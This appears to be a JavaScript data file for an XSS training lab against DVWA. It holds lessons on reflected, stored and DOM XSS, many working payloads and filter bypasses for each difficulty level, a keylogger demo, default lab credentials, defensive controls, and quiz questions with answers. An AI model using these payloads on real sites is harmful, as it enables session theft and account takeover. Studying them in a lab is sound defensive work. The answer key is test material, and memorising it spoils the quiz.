const LESSONS = [
  {
    title: "1. What is XSS & Core Concepts",
    points: 20,
    content: `Welcome to the Comprehensive XSS Lab! We are going to master "Cross-Site Scripting" (XSS) across all DVWA difficulty levels and XSS types.

WHAT IS XSS?
Imagine a website is a magic whiteboard where people can leave messages for each other. XSS happens when an attacker writes a secret JavaScript spell on the board instead of a normal message. When a victim views the board, their browser accidentally executes the spell! This can steal cookies, log keystrokes, or perform unauthorized actions.

COMMON JAVASCRIPT FUNCTIONS USED IN XSS
When crafting payloads, attackers rely on specific built-in JavaScript functions and properties:
• alert(1) — Pops up an alert box (classic proof of concept).
• confirm(1) — Pops up a confirmation dialog box.
• prompt(1) — Pops up an input prompt box.
• document.cookie — Accesses the victim's session cookies.
• document.domain — Displays the domain of the current web page.
• window.location — Redirects the victim to another URL (e.g., an attacker's server).

PRACTICE FLOW ROADMAP
To master XSS, follow this structured learning path throughout the lab:
1. Beginner: Learn basic tags like <script>alert(1)</script>, <img onerror>, and <svg onload>.
2. Intermediate: Master event handlers (onfocus, onmouseover), filter bypasses, and encoded payloads.
3. Advanced: Explore Polyglots, DOM sinks, CSP bypasses, and mutation XSS.

STEP 1: Start the Lab Environment
Click the "Launch DVWA Instance" button above. Wait for your private Docker container to spin up.

STEP 2: Log In & Configure
• Username: admin
• Password: password

STEP 3: Reset Database & Set Security Level
Scroll down and click "Create / Reset Database". Then go to "DVWA Security" on the left menu, set the level to "Low", and click "Submit".`,
    questions: [
      { q: "What is the default username for our lab?", a: "admin" },
      { q: "What is the default password?", a: "password" },
      { q: "What language are XSS spells usually written in?", a: "JavaScript" },
      { q: "Which JS function pops up a confirmation dialog box?", a: "confirm" }
    ]
  },
  {
    title: "2. DVWA XSS (Reflected)",
    points: 30,
    content: `Reflected XSS is like an echo. You send a malicious payload to the website (usually via a URL parameter), and the website immediately echoes it back into the response HTML without sanitizing it.

Path: DVWA → XSS (Reflected)

🟢 EASY (LOW) — No Filtering
The server blindly reflects the 'name' parameter. Try these categories:
• Basic Alert Payloads:
  <script>alert(1)</script>
  <script>alert('XSS')</script>
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
• HTML Injection:
  <h1>Hacked</h1>
  <b>XSS TEST</b>
• JavaScript Injection:
  <script>document.write(document.cookie)</script>
  <script>confirm(1)</script>
• Cookie Theft Demo (Lab Only):
  <script>alert(document.cookie)</script>
• Event Handler Payloads:
  <body onload=alert(1)>
  <input onfocus=alert(1) autofocus>
  <marquee onstart=alert(1)>
• Filter Bypass & Encoded Payloads:
  <ScRiPt>alert(1)</ScRiPt>
  <script>alert(String.fromCharCode(88,83,83))</script>
  <img src=1 onerror=alert(String.fromCharCode(88,83,83))>
  %3Cscript%3Ealert(1)%3C/script%3E

🟡 MEDIUM — Script Tag Filtering
Common Filters: Medium blocks the exact lowercase string <script>.
Bypass using alternate payloads, mixed casing, or whitespace manipulation:
• IMG Payload: <img src=x onerror=alert(1)>
• SVG Payload: <svg onload=alert(1)>
• IFRAME Payload: <iframe src=javascript:alert(1)>
• Input Event Payload: <input autofocus onfocus=alert(1)>
• Body Event Payload: <body onpageshow=alert(1)>
• Mixed Case Bypass: <ImG sRc=x oNeRrOr=alert(1)> or <SCRIPT>alert(1)</SCRIPT>
• Space Bypass: <img/src=x/onerror=alert(1)>
• Encoded Bypass: <svg/onload=alert\`1\`>

🔴 HARD (HIGH) — Strict Regex Protection
Common Protections: High uses preg_replace() to strip anything matching <*script* in any case.
Bypass by avoiding the word "script" entirely or leveraging precise contexts:
• Advanced SVG Payload: <svg><script>alert(1)</script> (Note: DVWA strips <svg><script leaving >alert(1)</script>, demonstrating how aggressive regex breaks tags).
• IMG OnError: <img src=x onerror=alert(document.domain)> (Works perfectly!).
• Encoded Payload: &#60;script&#62;alert(1)&#60;/script&#62; (Bypasses server filter but renders as safe text).
• JavaScript URI: <a href="javascript:alert(1)">click</a> (Stripped by regex).
• Attribute Injection: " onmouseover="alert(1)
• Autofocus Payload: <input autofocus onfocus=alert(1)>
• Polyglot Payload: javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>

🛡️ IMPOSSIBLE — Secure Output Encoding
Payloads That Fail: <script>alert(1)</script>, <img src=x onerror=alert(1)>
Reason: The server uses htmlspecialchars() for output encoding, along with CSP protections, input validation, and sanitization. Dangerous brackets (< and >) are converted to safe HTML entities (&lt; and &gt;), rendering the echo completely harmless!`,
    questions: [
      { q: "Which attack is like an echo yelling the spell back at you?", a: "Reflected XSS" },
      { q: "What tag can we use to run a spell when an image fails to load?", a: "img" },
      { q: "What tool translates our attack into harmless safe text on Impossible mode?", a: "htmlspecialchars" }
    ]
  },
  {
    title: "3. DVWA XSS (Stored)",
    points: 30,
    content: `Stored XSS is the most dangerous variant! It's like painting a poisoned spell permanently onto a billboard. The payload is saved in the database, attacking every user who views the page.

Path: DVWA → XSS (Stored)

🟢 EASY (LOW) — Basic Stored XSS
The guestbook stores comments without escaping.
• Name Field: test
• Message Field: <script>alert(1)</script>
• Cookie Access: <script>alert(document.cookie)</script>
• Persistent Payload: <img src=x onerror=alert('stored xss')>
• Redirect Payload: <script>window.location='http://example.com'</script>
• Keylogger Demo (Lab Only):
  <script>
  document.onkeypress=function(e){
    alert(e.key)
  }
  </script>

🟡 MEDIUM — Message Sanitization & Client-Side Limits
In Medium, the Message box is fully sanitized using strip_tags() and htmlspecialchars(). However, the Name box only strips lowercase <script>.
Bypass the 10-character HTML limit on the Name box:
1. Right-click the Name box and select "Inspect" (DevTools).
2. Find maxlength="10" and change it to maxlength="100".
3. Inject these payloads into the Name field:
• Script Tag Filter Bypass: <img src=x onerror=alert(1)>
• SVG Payload: <svg onload=alert(1)>
• Event Injection: <div onmouseover=alert(1)>hover me</div>
• Encoded Script: &#60;script&#62;alert(1)&#60;/script&#62;
• IFRAME Payload: <iframe src=javascript:alert(1)>

🔴 HARD (HIGH) — Regex Filtering on Name Field
In High, the Name field uses strict regex to strip *script*. Expand the maxlength to 100 via DevTools and inject non-script payloads:
• Advanced Payloads:
  <svg/onload=alert(1)>
  <img src=x onerror=alert(document.cookie)>
  <a href=javascript:alert(1)>click</a> (Stripped by regex).
• Attribute Escape: " autofocus onfocus=alert(1) x="
• Polyglot Payload: </textarea><svg onload=alert(1)>

🛡️ IMPOSSIBLE — Absolute Defense
Payloads That Fail: <script>alert(1)</script>, <img src=x onerror=alert(1)>
Reason: The server implements strict HTML encoding (htmlspecialchars) on both Name and Message fields, enforces Content Security Policy (CSP), uses robust sanitization, and employs secure parameterized database queries (PDO).`,
    questions: [
      { q: "Does Stored XSS save the spell permanently in the database? (yes/no)", a: "yes" },
      { q: "Which box has a restriction of 10 letters that we have to bypass using DevTools?", a: "Name" },
      { q: "What JS property gives access to the victim's session cookies?", a: "document.cookie" }
    ]
  },
  {
    title: "4. DVWA XSS (DOM)",
    points: 30,
    content: `DOM XSS is a subtle vulnerability that occurs entirely inside the victim's web browser. The server never sees the attack payload because it is processed by insecure client-side JavaScript.

Path: DVWA → XSS (DOM)

🟢 EASY (LOW) — URL-Based Execution
The client-side script extracts the 'default' parameter from the URL and writes it directly into the page via document.write().
• Basic URL Payload:
  http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert(1)</script>
• IMG Payload:
  http://localhost/dvwa/vulnerabilities/xss_d/?default=<img src=x onerror=alert(1)>
• SVG Payload:
  http://localhost/dvwa/vulnerabilities/xss_d/?default=<svg onload=alert(1)>
• DOM Manipulation & Cookie Access:
  ?default=<script>document.body.innerHTML='XSS'</script>
  ?default=<script>alert(document.cookie)</script>

🟡 MEDIUM — Server-Side Substring Checks & Dropdown Breakout
Medium checks the URL on the server side and redirects if it sees "<script".
Bypass this by using alternate tags or leveraging the URL hash (#) fragment:
• Encoded URL Payload: ?default=%3Cscript%3Ealert(1)%3C/script%3E (Caught by server).
• IMG Payload (Dropdown Breakout): ?default=</option></select><img src=x onerror=alert(1)>
• SVG Payload: ?default=</option></select><svg/onload=alert(1)>
• Hash-Based Injection: ?default=English#<img src=x onerror=alert(1)> (The hash # is never sent to the server, completely bypassing server-side filters!).

🔴 HARD (HIGH) — Strict Server-Side Whitelist
High enforces a strict server-side whitelist containing only allowed languages ("English", "French", etc.).
Bypass this entirely by placing your payload inside the URL hash fragment (#), which is processed exclusively by the client-side DOM:
• Advanced DOM Payloads:
  ?default=English#<svg onload=alert(document.domain)>
  ?default=English#<iframe src=javascript:alert(1)>
• Encoded Bypass: ?default=English#%3Csvg%20onload=alert(1)%3E
• Polyglot Payload: ?default=English#javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>

🛡️ IMPOSSIBLE — Safe DOM APIs & Native Encoding
Payloads That Fail: <script>alert(1)</script>, <img src=x onerror=alert(1)>
Reason: In Impossible mode, the application stops decoding the URI parameters and assigns the text using safe DOM manipulation APIs (such as textContent or innerText) instead of the dangerous innerHTML or document.write(). This forces the browser to treat the input as static text rather than executable code.`,
    questions: [
      { q: "Where does DOM XSS happen entirely? (Inside the...)", a: "browser" },
      { q: "What symbol (#) hides our attack payload from the server?", a: "#" },
      { q: "Which dangerous DOM sink blindly executes code? (innerHTML or textContent)", a: "innerHTML" },
      { q: "Which safe DOM API renders content strictly as static text?", a: "textContent" }
    ]
  },
  {
    title: "5. Bypasses, Tools & Ultimate Defense",
    points: 30,
    content: `To become an expert defender, you must understand both how advanced attackers bypass filters and how to implement airtight security controls.

COMMON XSS FILTER BYPASSES
When basic payloads fail, attackers use clever encoding and syntax tricks:
• Mixed Case: <ScRiPt>alert(1)</ScRiPt> (Bypasses weak case-sensitive filters).
• No Quotes: <img src=x onerror=alert(1)> (Bypasses quote stripping).
• Backticks: <svg/onload=alert\`1\`> (Bypasses parenthesis filtering).
• UTF Encoding: %3Cscript%3Ealert(1)%3C/script%3E (Bypasses basic WAF rules).

AUTOMATED TESTING TOOLS
Real-world bug bounty hunting relies on automated tools to scan at scale:
1. Burp Suite (Intruder): Fuzz input parameters using SecLists XSS polyglots.
2. XSStrike: An advanced XSS detection suite that analyzes context and dynamically generates custom working payloads.
3. OWASP ZAP: Active Scan automatically fuzzes and identifies successful execution sinks.

HOW TO STOP THE BAD GUYS (DEFENSIVE CONTROLS)
1. THE BAD DEFENSE (Blacklisting)
Trying to block specific bad words (like "<script>") is like playing whack-a-mole. Attackers will always find new vectors (like "<img onerror="). Blacklisting is ineffective!

2. THE GOOD DEFENSE (Context-Aware Output Encoding)
Whenever user-supplied data is displayed, pass it through an encoding function like htmlspecialchars(). This converts dangerous characters (<, >, &, ", ') into safe HTML entities before rendering.

3. THE GOOD ROBOT (Safe DOM APIs)
When writing client-side JavaScript, always use safe properties like textContent or innerText rather than dangerous sinks like innerHTML or document.write().

4. THE SHIELD (Content Security Policy - CSP)
Implement a robust HTTP header (Content-Security-Policy) that restricts where scripts can be loaded from and restricts inline script execution.`,
    questions: [
      { q: "Is trying to block bad words (Blacklisting) an effective defense? (yes/no)", a: "no" },
      { q: "What defense translates dangerous characters into safe HTML entities? (Output...)", a: "Output Encoding" },
      { q: "What is the name of the HTTP header rule that restricts script execution? (Content Security...)", a: "Content Security Policy" },
      { q: "What advanced payload combines multiple syntax styles to bypass complex filters? (Poly...)", a: "Polyglot" }
    ]
  }
];
